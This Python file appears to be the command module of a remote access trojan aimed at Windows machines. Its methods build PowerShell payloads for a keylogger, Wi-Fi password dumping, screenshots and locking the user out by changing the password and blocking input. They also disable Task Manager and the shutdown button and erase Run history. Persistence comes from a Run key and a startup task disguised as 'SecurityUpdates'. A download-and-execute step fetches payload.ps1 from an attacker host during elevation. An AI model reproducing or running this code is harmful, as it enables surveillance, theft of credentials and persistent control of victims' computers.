import os
import platform

class Commands:
    def convert_to_string(data):
        string =  " "
        return (string.join(data))
    def help():
        print("""
    Important commands

    $pid
    get_admin
    amiroot
    clear_Run
    get_wifipassword
    key_scan
    take_screenshot  

    Common Commands:
        edit [filename.txt]
        cat  [filename.txt]
        move [item_move] [path_move]
        remove [filename.txt/folder]
        rename [filename.txt/folder]
        create [filename.txt/folder]
        kill [filename.txt]
        kill pid [pid]
        [enable/disable] taskmanager 
        [enable/disable] shutdown-button 
        [enable/disable] restart-button 

    Windows Functions:
        reboot    
        lock
        logoff
        shutdown
        sleep
        eject_dvd
        

    Fun Commands:
        show_desktop
        speak [text]
        freeze [seconds]      Requires Admin  #work in progress
        wallpaper [link] or wallpaper [file]
        press [key/text]
        send_message
        send_notification
        volume [password] #admin priviledges
        blank_screen

    Persistence
        get_persistence 
        load_reg_persistence [file]
        schedule_task_at_startup [file]
""")

    def lock():
        return "$xCmdString = {rundll32.exe user32.dll,LockWorkStation};Invoke-Command $xCmdString"

    def clear():
        if platform.system() == 'Windows':
            os.system('cls')
        else:
            os.system('clear')
    def fake_notification(icon,title,body):
        code = f"""
Add-Type -AssemblyName System.Windows.Forms;
$global:balmsg = New-Object System.Windows.Forms.NotifyIcon;
$path = (Get-Process -id $pid).Path;
$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path);
$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning;
$balmsg.BalloonTipText = "{body}";
$balmsg.BalloonTipTitle = "{title}";
$balmsg.Visible = $true;
$balmsg.ShowBalloonTip(20000);"""
        return code
    def show_desktop():
        return "(New-Object -Com  Shell.Application).toggleDesktop()"
    def speak(text):
        return f"""Add-Type -AssemblyName System.speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('{text}')""" 
    def change_wallpaper_from_link(link):
        return f"""iwr -Uri '"""+link+"""' -OutFile "C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\wallpaper";sp 'HKCU:Control Panel\Desktop' WallPaper 'C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\wallpaper';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)"""     
    def change_wallpaper_from_file(filename):
        return"""sp 'HKCU:Control Panel\Desktop' WallPaper 'C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\"""+filename+"""';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)"""
    def get_wifipassword():
        return """
$wifi=(get-netconnectionProfile).Name;
if($wifi -is [array]){Foreach($id in $wifi){netsh wlan show profile name=$id key=clear}}
else{netsh wlan show profile name=$wifi key=clear}
"""
    def press_key(keys):
        if keys =="enter":
            keys = "~"
        elif keys == "windows":
            keys = "^{ESC}"    
   
        return f""" Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait('{keys}');""" 
# BACKSPACE	{BACKSPACE}, {BS}, or {BKSP}
# BREAK	{BREAK}
# CAPS LOCK	{CAPSLOCK}
# DEL or DELETE	{DELETE} or {DEL}
# DOWN ARROW	{DOWN}
# END	{END}
# ENTER	{ENTER}or ~
# ESC	{ESC}
# HELP	{HELP}
# HOME	{HOME}
# INS or INSERT	{INSERT} or {INS}
# LEFT ARROW	{LEFT}
# NUM LOCK	{NUMLOCK}
# PAGE DOWN	{PGDN}
# PAGE UP	{PGUP}
# PRINTSCREEN	{PRTSC} (reserved for future use)
# RIGHT ARROW	{RIGHT}
# SCROLL-LOCK	{SCROLLLOCK}
# tab	{TAB}
# UP ARROW	{UP}
# F1	{F1}
# F2	{F2}
# F3	{F3}
# F4	{F4}
# F5	{F5}
# F6	{F6}
# F7	{F7}
# F8	{F8}
# F9	{F9}
# F10	{F10}
# F11	{F11}
# F12	{F12}
# F13	{F13}
# F14	{F14}
# F15	{F15}
# F16	{F16}
# Keypad add	{ADD}
# subtract keypad	{SUBTRACT}
# Keypad multiply	{MULTIPLY}
# Keypad splits	{DIVIDES}           
# Key	Code
# SHIFT	+
# CTRL	^
# ALT	%
    def set_volume(value):
        code = """
Function Set-SoundVolume 
{
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    $obj = New-Object -ComObject WScript.Shell
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}Set-SoundVolume """ + value 

        return code
    def kill_process(process):
        return f"""taskkill /F /PID {process}"""

    def kill_application(application):
        return f"""taskkill /im {application} /f"""

    def eject_dvd_drive():
        return """(new-object -COM Shell.Application).NameSpace(0).ParseName('E:').InvokeVerb('Eject')"""   

    def key_scan(time):
        return """
$time = new-timespan -Seconds """+f"""{time}"""+""";
$sw = [diagnostics.stopwatch]::StartNew();
$key = ""
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
  try{while ($sw.elapsed -lt $time) {     
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $mychar = New-Object -TypeName System.Text.StringBuilder
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          if ($success) {
            # $Path = $mychar;write-host $Path -NoNewline}}}}}catch{write-host $Error}}run
            $Path = $mychar;$key=$key+$Path}}}}}
  catch{write-host $Error};$key"""    

    def reboot():
        return """Restart-Computer"""

    def blank_screen():
        return """(Add-Type -MemberDefinition "[DllImport(""user32.dll"")]`npublic static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);" -Name "Win32SendMessage" -Namespace Win32Functions -PassThru)::SendMessage(0xffff, 0x0112, 0xF170, 2)"""    
    def shutdown():
        return """Stop-Computer"""    
    def take_screenshot():
        return """
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphic = [System.Drawing.Graphics]::FromImage($image)
$point = New-Object System.Drawing.Point(0, 0)
$graphic.CopyFromScreen($point, $point, $image.Size);
$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
$screen_file = "C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\screenshot.png"
$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png)"""

    def create_file(filename):
        return f"""New-Item -Path . -Name "{filename}" -ItemType "file" -Value " " """

    def create_directory(directoryname):
        return f"""New-Item  -Name {directoryname} -ItemType "directory"  """
    def check_admin():
        return """
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$p = New-Object System.Security.Principal.WindowsPrincipal($id)
if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){ Write-Output $true }      
else{ Write-Output $false }"""    
    def logoff():
        return """shutdown /l"""
    def change_password(password):
        return f"""$password = ConvertTo-SecureString -String '{password}' -AsPlainText -Force;$UserAccount = Get-LocalUser -Name $env:UserName;$UserAccount | Set-LocalUser -Password $password"""    
    def disable_taskmanager():
        return """reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"""
    def enable_taskmanager():
        return """reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f"""
    def disable_shutdownbutton():
        return """Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" -Name "value" -Value 1"""    
    def enable_shutdownbutton():
        return """Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" -Name "value" -Value 0"""
    def disable_restartbutton():
        return"""Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart" -Name "value" -Value 1"""
    def enable_restartbutton():
        return"""Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart" -Name "value" -Value 0"""            
    def freeze(time):
        return"""
$code = @"
[DllImport("user32.dll")]
public static extern bool BlockInput(bool fBlockIt);
"@;
$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
function Disable-UserInput($seconds) {
$userInput::BlockInput($true)
Start-Sleep $seconds
$userInput::BlockInput($false)
}Disable-UserInput -seconds """+time+""" | Out-Null"""

    def send_message(title,message):
        return """
start powershell -WindowStyle hidden  "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); 
[System.Windows.Forms.MessageBox]::Show('"""+message+"""','"""+title+"""')}" 
"""
    def clear_run_history():
        return """reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"""

    def get_admin(host):
        return """
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Window 1 -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://"""+host+""":8080/payload.ps1');`"";
}"""

    def move_item(item_to_move,path_to_move):
        return f"""Move-Item -Path {item_to_move} -Destination {path_to_move}"""

    def schedule_task_at_startup(path):
        return f"""
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:50
Register-ScheduledJob -Trigger $trigger -FilePath "{path}" -Name SecurityUpdates
"""
    def run_file_at_startup(path):
        return f"""reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "{path}" """
